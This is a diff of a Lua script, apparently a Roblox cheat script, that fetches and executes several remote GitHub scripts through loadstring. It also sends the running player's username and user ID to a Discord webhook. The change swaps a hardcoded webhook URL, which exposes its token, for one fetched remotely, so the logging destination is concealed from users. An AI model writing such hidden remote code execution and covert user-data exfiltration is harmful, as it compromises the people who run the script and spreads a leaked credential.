@@ -1,7 +1,8 @@
 local SalunaVersion = "Saluna 009 (08/05/2025)"
 local qweur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/a',true))()
 local retur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/b',true))()
-local stofur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/b',true))()
+local stofur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/c',true))()
+local logur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/d',true))()
 task.wait()
 usingname = game:GetService("Players").LocalPlayer.Name
 usingid = game:GetService("Players").LocalPlayer.UserId
@@ -9507,7 +9508,6 @@ if success and response then
 end
 local antitable = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/anticamp.lua',true))()
 if not table.find(antitable,game.Players.LocalPlayer.Name) then
-local url = "https://discord.com/api/webhooks/1364581628760031363/IjUB6iDa9lfjZstZXL7SdZbrZCEAq7C5AIJCJwQdkkJzmkQ-3sstPPVfGNOyJkSjMiBU"
         local data = {
         ["content"] = "",
         ["embeds"] = {
@@ -9525,7 +9525,7 @@ local url = "https://discord.com/api/webhooks/1364581628760031363/IjUB6iDa9lfjZs
         ["content-type"] = "application/json"
         }
         request = http_request or request or HttpPost or syn.request
-        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        local abcdef = {Url = logur, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
 end
 
